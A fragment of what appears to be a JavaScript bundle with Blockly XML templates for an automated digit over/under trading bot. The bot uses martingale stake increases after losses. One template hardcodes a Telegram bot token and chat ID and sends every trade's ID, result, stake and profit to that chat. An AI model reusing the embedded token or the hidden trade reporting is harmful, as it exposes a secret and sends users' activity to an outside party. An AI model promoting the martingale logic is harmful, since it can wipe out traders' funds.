id="f|+X(z[g;.k~:n`s@StB">Use Martingale</field>\n                        <value name="VALUE">\n                          <block type="logic_boolean" id=".*7jl.m*8Kh-Sg#eOfzv">\n                            <field name="BOOL">TRUE</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="I)2f2cwr3#F/RkE]Q]An">\n                            <field name="VAR" id="#5}q![T#9ogJNgfpd#|e">Stake win</field>\n                            <value name="VALUE">\n                              <block type="variables_get" id="+?%jfUb@{Q;xy9=MUZkY">\n                                <field name="VAR" id="m/0@k04/{zd{;wbJaCj1">Stake</field>\n                              </block>\n                            </value>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="trade_definition_tradeoptions" id="YlN6/mK`2?~CC8mpG2((">\n        <mutation xmlns="http://www.w3.org/1999/xhtml" has_first_barrier="false" has_second_barrier="false" has_prediction="false"></mutation>\n        <field name="DURATIONTYPE_LIST">t</field>\n        <value name="DURATION">\n          <shadow type="math_number_positive" id="Rly=xeTN=dXTVEHsjl(M">\n            <field name="NUM">1</field>\n          </shadow>\n        </value>\n        <value name="AMOUNT">\n          <shadow type="math_number_positive" id="S]pcNthvd:C*4%q-!KH[">\n            <field name="NUM">0.35</field>\n          </shadow>\n          <block type="variables_get" id="y-ONXw~@Bji.I^:hS.*k">\n            <field name="VAR" id="m/0@k04/{zd{;wbJaCj1">Stake</field>\n          </block>\n        </value>\n      </block>\n    </statement>\n  </block>\n  <block type="during_purchase" id="9bO9Z1(FQGB9J7e3)r(z" x="714" y="60">\n    <statement name="DURING_PURCHASE_STACK">\n      <block type="controls_if" id="NB{R`*P[{04o`E#)Dt1F">\n        <value name="IF0">\n          <block type="check_sell" id="#C6@D$q0)!i_@E:NDwX~"></block>\n        </value>\n      </block>\n    </statement>\n  </block>\n  <block type="after_purchase" id="DKxh:jC3$uil/#H(6wFw" collapsed="true" x="714" y="292">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="controls_if" id="_16pn/[g`T8*+~x-UfYl">\n        <mutation xmlns="http://www.w3.org/1999/xhtml" else="1"></mutation>\n        <value name="IF0">\n          <block type="contract_check_result" id="pdxLmXd7C*{sQK0F?=Mf">\n            <field name="CHECK_RESULT">win</field>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="variables_set" id="{ZVa]0)3cG805%jzddIF">\n            <field name="VAR" id="m/0@k04/{zd{;wbJaCj1">Stake</field>\n            <value name="VALUE">\n              <block type="variables_get" id="Foa|d!t1M^TTh[o(naLR">\n                <field name="VAR" id="#5}q![T#9ogJNgfpd#|e">Stake win</field>\n              </block>\n            </value>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="controls_if" id="TE:$72h*prs~nzbu#P~,">\n            <mutation xmlns="http://www.w3.org/1999/xhtml" else="1"></mutation>\n            <value name="IF0">\n              <block type="logic_compare" id="wo73hZn0XUyYi.Eey2G=">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="3hwbgtTW}5a}YmC0+.Y*">\n                    <field name="VAR" id="f|+X(z[g;.k~:n`s@StB">Use Martingale</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="logic_boolean" id="U6T%Emp[kz%1Jg2[xzM]">\n                    <field name="BOOL">TRUE</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="variables_set" id="2!zWVkpmJpm4ov:F/jnK">\n                <field name="VAR" id="m/0@k04/{zd{;wbJaCj1">Stake</field>\n                <value name="VALUE">\n                  <block type="math_arithmetic" id=":/jO^I*p35DU.yO+nZc/">\n                    <field name="OP">MULTIPLY</field>\n                    <value name="A">\n                      <shadow type="math_number" id="^jzG)L]-oM]4|CTuYhS_">\n                        <field name="NUM">1</field>\n                      </shadow>\n                      <block type="variables_get" id="}dBsO54jjOdO.~H+50t@">\n                        <field name="VAR" id="m/0@k04/{zd{;wbJaCj1">Stake</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <shadow type="math_number" id="y,w4ZM^HpP{q`OjqFG.-">\n                        <field name="NUM">1</field>\n                      </shadow>\n                      <block type="variables_get" id="!{es{{P;L1^;EV|Tl|0M">\n                        <field name="VAR" id="ge%ZkkYmJ/b9o4*B[}=,">Martingale</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n              </block>\n            </statement>\n            <statement name="ELSE">\n              <block type="variables_set" id="G(4l?Ejam+,/~[MQxe-+">\n                <field name="VAR" id="m/0@k04/{zd{;wbJaCj1">Stake</field>\n                <value name="VALUE">\n                  <block type="variables_get" id="77YnCED@Ya:C2Ss)ta(N">\n                    <field name="VAR" id="#5}q![T#9ogJNgfpd#|e">Stake win</field>\n                  </block>\n                </value>\n              </block>\n            </statement>\n          </block>\n        </statement>\n        <next>\n          <block type="controls_if" id="|#+f+levTAKkjfE#bi_1">\n            <mutation xmlns="http://www.w3.org/1999/xhtml" elseif="1" else="1"></mutation>\n            <value name="IF0">\n              <block type="logic_compare" id="`X^SoO?i,b0@f]}he!1`">\n                <field name="OP">GTE</field>\n                <value name="A">\n                  <block type="total_profit" id="$dOBV)vvJb+p?#0hb-+}"></block>\n                </value>\n                <value name="B">\n                  <block type="variables_get" id="Z9sqZM@m;j-El9#f}@:F">\n                    <field name="VAR" id="lr1s=lJ+AJ*`o.Y^L4}=">Take Profit</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="text_print" id="SEXl?7sIDAZ@#5~$QMuf">\n                <value name="TEXT">\n                  <shadow type="text" id="zACj}n;dx!z[my%tI9@=">\n                    <field name="TEXT">Congratulations!!! Take Profit Achieved</field>\n                  </shadow>\n                </value>\n              </block>\n            </statement>\n            <value name="IF1">\n              <block type="logic_compare" id="aL{)xvc@MNW4|8Pc7)#K">\n                <field name="OP">LTE</field>\n                <value name="A">\n                  <block type="total_profit" id="cxj,,iSlK,uQDm:PQIkN"></block>\n                </value>\n                <value name="B">\n                  <block type="math_single" id="Rx`lwa;iz4ZYk[5CIrLP">\n                    <field name="OP">NEG</field>\n                    <value name="NUM">\n                      <shadow type="math_number" id="hxVjd1L!och|?D%:gfn#">\n                        <field name="NUM">9</field>\n                      </shadow>\n                      <block type="variables_get" id="C{[Y/[=,5Jb{$L7L4KUx">\n                        <field name="VAR" id="hOWinPkCVo^_x#B^gBza">Stop Loss </field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO1">\n              <block type="text_print" id="qEG6M8!$4|Q`dMCp0%Cu">\n                <value name="TEXT">\n                  <shadow type="text" id="%}^@9l0%-gS_KGZ:fTer">\n                    <field name="TEXT">Sorry!!! Stop Loss Hit</field>\n                  </shadow>\n                </value>\n              </block>\n            </statement>\n            <statement name="ELSE">\n              <block type="trade_again" id="2xYLh*i~;%KTTjSI9)a|"></block>\n            </statement>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n  <block type="before_purchase" id="8U(MIh|Hq[HA%,Jl?^4P" deletable="false" x="0" y="930">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="apollo_purchase" id="Zs~Je?VCXC|iJ)!w+$Rn">\n        <field name="PURCHASE_LIST">CALL</field>\n      </block>\n    </statement>\n  </block>\n  <block type="math_number" id="Sd_7]-H|3.m;84;U?lJE" disabled="true" x="0" y="1108">\n    <field name="NUM">0</field>\n  </block>\n</xml>'
            },
            3082: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="https://developers.google.com/blockly/xml" is_dbot="true" collection="false">\n  <variables>\n    <variable id=":o#E4Mv[vmJES2fN=qo0">Prediction</variable>\n    <variable id="]_MS:$MrQakFy~dy[v}a">Text2</variable>\n    <variable id="7Q4y$nr_sr!x2NkOu%)2">Stake</variable>\n    <variable id="K`h}~iKgn?Z)RHYaKFfT">Under Prediction</variable>\n    <variable id="HyNhO~!rk1(6_u;tk|_i">Trade Direction</variable>\n    <variable id="E~[s.X5egS+P$^H_o#nk">Entry Point</variable>\n    <variable id=":Z8WvPXWG?qCe|8=iii1">Expected Profit</variable>\n    <variable id="V3`ByiTyoj~_e_hJc;X=">Stake1</variable>\n    <variable id="L.cN$B-UUzkS|eDQm2xZ">Stop Loss</variable>\n    <variable id="=[Z~Xr60)Z7,Gh`bAzuF">Notify</variable>\n    <variable id="uIhzq(Rnu7?ay*)Lax`q">Loss</variable>\n    <variable id="@GRV-f=US~_%4pd.i}2Q">Recovery Prediction</variable>\n    <variable id="o#PtO)-%Wvm_=AQvH38N">Martingale</variable>\n  </variables>\n  <block type="trade_definition" id="Trl.sJ3}+U,c~e-zFUy^" deletable="false" x="0" y="60">\n    <statement name="TRADE_OPTIONS">\n      <block type="trade_definition_market" id="~=oeIoZ%WS/q]1NWBf;P" deletable="false" movable="false">\n        <field name="MARKET_LIST">synthetic_index</field>\n        <field name="SUBMARKET_LIST">random_index</field>\n        <field name="SYMBOL_LIST">R_100</field>\n        <next>\n          <block type="trade_definition_tradetype" id="uT06=pes~zdz4ppk!7al" deletable="false" movable="false">\n            <field name="TRADETYPECAT_LIST">digits</field>\n            <field name="TRADETYPE_LIST">overunder</field>\n            <next>\n              <block type="trade_definition_contracttype" id="+:36ts]!!))@0zb2Cw?}" deletable="false" movable="false">\n                <field name="TYPE_LIST">DIGITUNDER</field>\n                <next>\n                  <block type="trade_definition_candleinterval" id="`-._(9_zhwbfP0b9+,d}" deletable="false" movable="false">\n                    <field name="CANDLEINTERVAL_LIST">60</field>\n                    <next>\n                      <block type="trade_definition_restartbuysell" id="`/R47tY(;Ez%$vb[n+%*" deletable="false" movable="false">\n                        <field name="TIME_MACHINE_ENABLED">FALSE</field>\n                        <next>\n                          <block type="trade_definition_restartonerror" id="wlGGC5P.p*4$V[]BL[iS" deletable="false" movable="false">\n                            <field name="RESTARTONERROR">TRUE</field>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="INITIALIZATION">\n      <block type="notify" id="EtVT(5w+bQ5K1~?lgY)H">\n        <field name="NOTIFICATION_TYPE">info</field>\n        <field name="NOTIFICATION_SOUND">announcement</field>\n        <value name="MESSAGE">\n          <shadow type="text" id="y45$(A//70MNMEok3mc1">\n            <field name="TEXT">abc</field>\n          </shadow>\n          <block type="text" id="z,gmVY/n$(E|C#^Y}q1;">\n            <field name="TEXT">Under 6 Signal</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="7sPy:Sl^ri)cRWQ=WuLm">\n            <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2">Stake</field>\n            <value name="VALUE">\n              <block type="math_number" id="qT87lDuK9}qjV+3;/[u6">\n                <field name="NUM">0.5</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="*##8y+nmgQ}K1y,}t^2T">\n                <field name="VAR" id="E~[s.X5egS+P$^H_o#nk">Entry Point</field>\n                <value name="VALUE">\n                  <block type="math_number" id="!$:`tm-dH0UWmd]/YmaC">\n                    <field name="NUM">4</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="|aPCht%cR1;/{xBLPS3`">\n                    <field name="VAR" id="K`h}~iKgn?Z)RHYaKFfT">Under Prediction</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="q?286.t{mx:LnX9J5j[,">\n                        <field name="NUM">6</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="([}7^3RUy=3jxOMc^PNJ">\n                        <field name="VAR" id=":Z8WvPXWG?qCe|8=iii1">Expected Profit</field>\n                        <value name="VALUE">\n                          <block type="math_number" id="3N|+2I?dnv(B)ixf$S$l">\n                            <field name="NUM">5</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="4Hj96![qXlxsC#x!b[~@">\n                            <field name="VAR" id="L.cN$B-UUzkS|eDQm2xZ">Stop Loss</field>\n                            <value name="VALUE">\n                              <block type="math_number" id="@.;$XBLeE~}}@:NV*!Fd">\n                                <field name="NUM">50</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="variables_set" id="q~xXAN;4$!Df1QE4L}Xy">\n                                <field name="VAR" id="o#PtO)-%Wvm_=AQvH38N">Martingale</field>\n                                <value name="VALUE">\n                                  <block type="math_number" id="3zPF*3u^2%y2US,S#(+-">\n                                    <field name="NUM">2</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="variables_set" id="~(`[dsZp^m9FuqDydNz3">\n                                    <field name="VAR" id="@GRV-f=US~_%4pd.i}2Q">Recovery Prediction</field>\n                                    <value name="VALUE">\n                                      <block type="math_number" id=":kdVhp0U=xE2ALN65?fz">\n                                        <field name="NUM">5</field>\n                                      </block>\n                                    </value>\n                                    <next>\n                                      <block type="procedures_callnoreturn" id="Nu3*]LggE,O|dzwSbzGA">\n                                        <mutation xmlns="http://www.w3.org/1999/xhtml" name="Fixed Blocks"></mutation>\n                                        <data>:Zu8Y}APEu3!!_[sinI5</data>\n                                      </block>\n                                    </next>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="trade_definition_tradeoptions" id="{Dkfk~3kkr.wc8@{)~m0">\n        <mutation xmlns="http://www.w3.org/1999/xhtml" has_first_barrier="false" has_second_barrier="false" has_prediction="true"></mutation>\n        <field name="DURATIONTYPE_LIST">t</field>\n        <value name="DURATION">\n          <shadow type="math_number" id="%PF8u9|zX9*I{Sj|1VT@">\n            <field name="NUM">1</field>\n          </shadow>\n        </value>\n        <value name="AMOUNT">\n          <shadow type="math_number" id="TJ!MrnCmrS$Bx?A%Huu8">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="[=[~D]2jYL~/tc4OS]8/">\n            <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2">Stake</field>\n          </block>\n        </value>\n        <value name="PREDICTION">\n          <shadow type="math_number_positive" id="t]=rH1V8+1.l+hnO2Z15">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="DR,CP(`,^*E0=DJ%4[ZZ">\n            <field name="VAR" id=":o#E4Mv[vmJES2fN=qo0">Prediction</field>\n          </block>\n        </value>\n      </block>\n    </statement>\n  </block>\n  <block type="after_purchase" id="Q!WjmqV!JmoPK$1p=,Z`" collapsed="true" x="893" y="60">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="controls_if" id=")DN{cw.=-)6[,2s01][y">\n        <mutation xmlns="http://www.w3.org/1999/xhtml" elseif="1" else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="_A{.]PjMZUh!;SaEL(PQ">\n            <field name="OP">GT</field>\n            <value name="A">\n              <block type="total_profit" id="kF8CU|)Q8);OEBV23B35"></block>\n            </value>\n            <value name="B">\n              <block type="variables_get" id="H6A]tIXPMPJiME$*UNm5">\n                <field name="VAR" id=":Z8WvPXWG?qCe|8=iii1">Expected Profit</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="text_join" id="_k:V[v`h|_I*K4:#)ubt">\n            <field name="VARIABLE" id="]_MS:$MrQakFy~dy[v}a">Text2</field>\n            <statement name="STACK">\n              <block type="text_statement" id="1g~?n9%iP08%^|a}^)D-">\n                <value name="TEXT">\n                  <shadow type="text" id="8x84,??pD;a}S^9Xe,fn">\n                    <field name="TEXT"></field>\n                  </shadow>\n                  <block type="text" id="#GiuOl|!IS#.dQ,z^u{[">\n                    <field name="TEXT">Congrats.  Take Profit hit \uD83D\uDC4D </field>\n                  </block>\n                </value>\n                <next>\n                  <block type="text_statement" id="Wzeq`?|_(.Zo(MF%PVUa">\n                    <value name="TEXT">\n                      <shadow type="text" id="}N!T)apd~+!_c/N8Si}1">\n                        <field name="TEXT"></field>\n                      </shadow>\n                      <block type="total_profit" id="{kIC:;hH!GMLK%hKOr-T"></block>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="text_print" id="N(~vr~Hw#=;E6-FksizO">\n                <value name="TEXT">\n                  <shadow type="text" id="Bp6$(VRo#UxnC*1F~=(Y">\n                    <field name="TEXT">abc</field>\n                  </shadow>\n                  <block type="variables_get" id="#Nh0(1m^U=cv7LhiE+?x">\n                    <field name="VAR" id="]_MS:$MrQakFy~dy[v}a">Text2</field>\n                  </block>\n                </value>\n              </block>\n            </next>\n          </block>\n        </statement>\n        <value name="IF1">\n          <block type="logic_compare" id="smzONScgAqZX.OfS0Qdq">\n            <field name="OP">LTE</field>\n            <value name="A">\n              <block type="total_profit" id="W4`xJpW1oHU2|pLa=B|h"></block>\n            </value>\n            <value name="B">\n              <block type="math_single" id="w6?ckXU=)J*%XYM%{0_G">\n                <field name="OP">NEG</field>\n                <value name="NUM">\n                  <shadow type="math_number" id="3b0oN!UO@MweXR~8#$|1">\n                    <field name="NUM">9</field>\n                  </shadow>\n                  <block type="variables_get" id="jbl|7CC[=%~@(EO`#P@K">\n                    <field name="VAR" id="L.cN$B-UUzkS|eDQm2xZ">Stop Loss</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO1">\n          <block type="text_print" id="X/MJb0Q;/=5axNI3uVKA">\n            <value name="TEXT">\n              <shadow type="text" id="W2[GJ[gjfV@JB:$(Y^8W">\n                <field name="TEXT">STOPLOSS HIT</field>\n              </shadow>\n            </value>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="controls_if" id="y|Maz[iF+,XXr*SS;dMc" collapsed="true">\n            <mutation xmlns="http://www.w3.org/1999/xhtml" else="1"></mutation>\n            <value name="IF0">\n              <block type="contract_check_result" id="XV2Q0E0iQiX9MAc}Ef8A">\n                <field name="CHECK_RESULT">win</field>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="variables_set" id="MrPv1PE+y[*~{SPeHB#v">\n                <field name="VAR" id="HyNhO~!rk1(6_u;tk|_i">Trade Direction</field>\n                <value name="VALUE">\n                  <block type="math_number" id="tI[r?GR?Wxfy^NA|7i}t">\n                    <field name="NUM">1</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="#t])Wko5d{6r,!u8rN`2">\n                    <field name="VAR" id=":o#E4Mv[vmJES2fN=qo0">Prediction</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id="z!x0@[~P}s`m{WK{O*N2">\n                        <field name="VAR" id="K`h}~iKgn?Z)RHYaKFfT">Under Prediction</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="H~1YIqKtXe3,ZmT@jw6+">\n                        <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2">Stake</field>\n                        <value name="VALUE">\n                          <block type="variables_get" id="VgEoCEi,e9l*VQ|#egF$">\n                            <field name="VAR" id="V3`ByiTyoj~_e_hJc;X=">Stake1</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="+|-b;cZbiZrCwLsK%A|7">\n                            <field name="VAR" id="uIhzq(Rnu7?ay*)Lax`q">Loss</field>\n                            <value name="VALUE">\n                              <block type="math_number" id="Vz/z)LkF9;{/EqO5FIqw">\n                                <field name="NUM">0</field>\n                              </block>\n                            </value>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <statement name="ELSE">\n              <block type="variables_set" id="N[OgR#+rozJPhhP1(mh`">\n                <field name="VAR" id="HyNhO~!rk1(6_u;tk|_i">Trade Direction</field>\n                <value name="VALUE">\n                  <block type="math_number" id="+EOo1sB@OV5LoQ^i*~$E">\n                    <field name="NUM">0</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="KVy-mg|N+4p=z,p%L@*Q">\n                    <field name="VAR" id=":o#E4Mv[vmJES2fN=qo0">Prediction</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id="+(V.|a~SZS3E%#i~/,=B">\n                        <field name="VAR" id="@GRV-f=US~_%4pd.i}2Q">Recovery Prediction</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="math_change" id="!-J0*a);qlq8P4ltOpUE">\n                        <field name="VAR" id="uIhzq(Rnu7?ay*)Lax`q">Loss</field>\n                        <value name="DELTA">\n                          <shadow type="math_number" id="SR%0!Cn9vDE3fHI)fP5:">\n                            <field name="NUM">1</field>\n                          </shadow>\n                        </value>\n                        <next>\n                          <block type="controls_if" id="yx`)8GK1%jmvlz55nup1">\n                            <mutation xmlns="http://www.w3.org/1999/xhtml" elseif="1"></mutation>\n                            <value name="IF0">\n                              <block type="logic_compare" id="$T(%`!cQnm3~bCv65^QR">\n                                <field name="OP">EQ</field>\n                                <value name="A">\n                                  <block type="variables_get" id="w#k/VfUHgsL*zWv(B{!r">\n                                    <field name="VAR" id="uIhzq(Rnu7?ay*)Lax`q">Loss</field>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <block type="math_number" id="daKP^(/{WmC8@oAcGz[B">\n                                    <field name="NUM">1</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                            <statement name="DO0">\n                              <block type="variables_set" id="CCt@ERU+uVH`v5)M}s92">\n                                <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2">Stake</field>\n                                <value name="VALUE">\n                                  <block type="math_arithmetic" id="nE$E;oeO[:5eP81gCVzx">\n                                    <field name="OP">MULTIPLY</field>\n                                    <value name="A">\n                                      <shadow type="math_number" id="uCEY}eO{3bo*pd1^yxV/">\n                                        <field name="NUM">1</field>\n                                      </shadow>\n                                      <block type="variables_get" id="=E0V(n6.B}uGLvO{8aVu">\n                                        <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2">Stake</field>\n                                      </block>\n                                    </value>\n                                    <value name="B">\n                                      <shadow type="math_number" id=",Jv`wG=Z}(v0Hh2=[2D0">\n                                        <field name="NUM">1</field>\n                                      </shadow>\n                                      <block type="math_number" id="Ochi#s2.7.~Z`nTR1Gu*">\n                                        <field name="NUM">1.2</field>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </value>\n                              </block>\n                            </statement>\n                            <value name="IF1">\n                              <block type="logic_compare" id="=74Q-mSE~}ppu45i!gQX">\n                                <field name="OP">GT</field>\n                                <value name="A">\n                                  <block type="variables_get" id="S`]UE7XL@9BqiEgBB;@:">\n                                    <field name="VAR" id="uIhzq(Rnu7?ay*)Lax`q">Loss</field>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <block type="math_number" id=":Vu:JjQ@YQakD4v~966!">\n                                    <field name="NUM">1</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                            <statement name="DO1">\n                              <block type="variables_set" id="Ts!Cd^)[R~sB(x/m?Nzl">\n                                <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2">Stake</field>\n                                <value name="VALUE">\n                                  <block type="math_arithmetic" id="6YX*.sjJnU(@!rz7mO3[">\n                                    <field name="OP">MULTIPLY</field>\n                                    <value name="A">\n                                      <shadow type="math_number" id="uCEY}eO{3bo*pd1^yxV/">\n                                        <field name="NUM">1</field>\n                                      </shadow>\n                                      <block type="variables_get" id="#7(?z.RH;/mTp]9jg:/5">\n                                        <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2">Stake</field>\n                                      </block>\n                                    </value>\n                                    <value name="B">\n                                      <shadow type="math_number" id=",Jv`wG=Z}(v0Hh2=[2D0">\n                                        <field name="NUM">1</field>\n                                      </shadow>\n                                      <block type="variables_get" id="iHH-yJ@:[b4x{MuW~Eoa">\n                                        <field name="VAR" id="o#PtO)-%Wvm_=AQvH38N">Martingale</field>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </value>\n                              </block>\n                            </statement>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="notify_telegram" id=")Ae{d=7lIj9}8:NX#n?d" collapsed="true">\n                <value name="TELEGRAM_ACCESS_TOKEN">\n                  <shadow type="text" id="bnihvyZxdk+{uRfocRpr">\n                    <field name="TEXT">7438897374:AAFMSg47EFubYdXSqbttO7f7y0rKkeQ0_RY</field>\n                  </shadow>\n                </value>\n                <value name="TELEGRAM_CHAT_ID">\n                  <shadow type="text" id="V`^bsurSiA=lkkXGpM3$">\n                    <field name="TEXT">-1002664692552</field>\n                  </shadow>\n                </value>\n                <value name="TELEGRAM_MESSAGE">\n                  <shadow type="text" id="hda}H_H81)%RjyU%tWs8">\n                    <field name="TEXT">gg</field>\n                  </shadow>\n                  <block type="variables_get" id="U2b^Y/mzLH{(bS(@6pg5">\n                    <field name="VAR" id="=[Z~Xr60)Z7,Gh`bAzuF">Notify</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="text_join" id="sDVrBrRWlnFe*HzSBVQh" collapsed="true">\n                    <field name="VARIABLE" id="=[Z~Xr60)Z7,Gh`bAzuF">Notify</field>\n                    <statement name="STACK">\n                      <block type="text_statement" id="=)Z._]dh)bGyfHG@hk9M">\n                        <value name="TEXT">\n                          <shadow type="text" id="g8*xyliQqpWbe(y,GY7b">\n                            <field name="TEXT">Contract ID: </field>\n                          </shadow>\n                        </value>\n                        <next>\n                          <block type="text_statement" id="1:+RSYLbcJ^G,1[FfH9q">\n                            <value name="TEXT">\n                              <shadow type="text" id="NB!{+B73_}E/MYi|sWT)">\n                                <field name="TEXT"></field>\n                              </shadow>\n                              <block type="read_details" id="E*RA`-I{4mn1qes6Uz-.">\n                                <field name="DETAIL_INDEX">1</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="text_statement" id="-+q:Enp%/dq-LSUM|d0E">\n                                <value name="TEXT">\n                                  <shadow type="text" id="cq6M_2IRPLlKh)_0H_el">\n                                    <field name="TEXT">  || Results: </field>\n                                  </shadow>\n                                </value>\n                                <next>\n                                  <block type="text_statement" id="H_t!vIoo8]h6Y#)})D=u">\n                                    <value name="TEXT">\n                                      <shadow type="text" id="5k]($=:c#lSss[3VPZ/,">\n                                        <field name="TEXT"></field>\n                                      </shadow>\n                                      <block type="read_details" id="?^dp0-s9waqHqKF+dE)z">\n                                        <field name="DETAIL_INDEX">11</field>\n                                      </block>\n                                    </value>\n                                    <next>\n                                      <block type="text_statement" id="XHbrHl(dVS6nAw+Lo=v}">\n                                        <value name="TEXT">\n                                          <shadow type="text" id="4+hDX)BH*@dt-MmCZ}oK">\n                                            <field name="TEXT">  || Stake: </field>\n                                          </shadow>\n                                        </value>\n                                        <next>\n                                          <block type="text_statement" id="J$S1c-Zpfq$36eV?N)X/">\n                                            <value name="TEXT">\n                                              <shadow type="text" id="!%e]l)(#sbL/OO3@MK$4">\n                                                <field name="TEXT"></field>\n                                              </shadow>\n                                              <block type="read_details" id="iJQ_Ctv,X7ov#T$9*1[n">\n                                                <field name="DETAIL_INDEX">2</field>\n                                              </block>\n                                            </value>\n                                            <next>\n                                              <block type="text_statement" id="00uOx4CC).Cd}:8e[PBg">\n                                                <value name="TEXT">\n                                                  <shadow type="text" id="{+=9;8s-d+U`,9Yh#3BH">\n                                                    <field name="TEXT">  || Profit: </field>\n                                                  </shadow>\n                                                </value>\n                                                <next>\n                                                  <block type="text_statement" id="}-(f}(J`sm#@a`G[yIjL">\n                                                    <value name="TEXT">\n                                                      <shadow type="text" id="]s!XMxJ`dp3E)KlEo|(o">\n                                                        <field name="TEXT"></field>\n                                                      </shadow>\n                                                      <block type="read_details" id="k~}I0bD]J5:nO;Tvpc^H">\n                                                        <field name="DETAIL_INDEX">4</field>\n                                                      </block>\n                                                    </value>\n                                                    <next>\n                                                      <block type="text_statement" id="12sgrL#^k-2bJ4!1,^+D">\n                                                        <value name="TEXT">\n                                                          <shadow type="text" id="DDi0^aPMegIYy:j+Vpji">\n                                                            <field name="TEXT">  || Total Profit: </field>\n                                                          </shadow>\n                                                        </value>\n                                                        <next>\n                                                          <block type="text_statement" id="Ci@6D2!Gu]T~C+$X;_Xc">\n                                                            <value name="TEXT">\n                                                              <shadow type="text" id="npkR_T/lD!lxrfDt?Civ">\n                                                                <field name="TEXT"></field>\n                                                              </shadow>\n                                                              <block type="total_profit" id="fWl9GWzu6D0k?6ma:|C~"></block>\n                                                            </value>\n                                                            <next>\n                                                              <block type="text_statement" id="R39OC^}Ar_HWe$~Fd%p3">\n                                                                <value name="TEXT">\n                                                                  <shadow type="text" id="yUDVex/$K=aQOeBvZc1X">\n                                                                    <field name="TEXT"> || No. of Runs: </field>\n                                                                  </shadow>\n                                                                </value>\n                                                                <next>\n                                                                  <block type="text_statement" id="]]M$~G5Fs#P[9NgH6QV)">\n                                                                    <value name="TEXT">\n                                                                      <shadow type="text" id="H_;UkNDdt,zaH/nT0ZkN">\n                                                                        <field name="TEXT"></field>\n                                                                      </shadow>\n                                                                      <block type="total_runs" id="P=p#:b|*`]+@~Xg1@W|@"></block>\n                                                                    </value>\n                                                                    <next>\n                                                                      <block type="text_statement" id="rs7)$-QFD$kmV4UKvpP/">\n                                                                        <value name="TEXT">\n                                                                          <shadow type="text" id="K+S?Z1sv$J4XUzsgND(}">\n                                                                            <field name="TEXT">     &gt;&gt;&gt; Under 6 Signal Bot</field>\n                                                                          </shadow>\n                                                                        </value>\n                                                                      </block>\n                                                                    </next>\n                                                                  </block>\n                                                                </next>\n                                                              </block>\n                                                            </next>\n                                                          </block>\n                                                        </next>\n                                                      </block>\n                                                    </next>\n                                                  </block>\n                                                </next>\n                                              </block>\n                                            </next>\n                                          </block>\n                                        </next>\n                                      </block>\n                                    </next>\n                                  </block>\n                                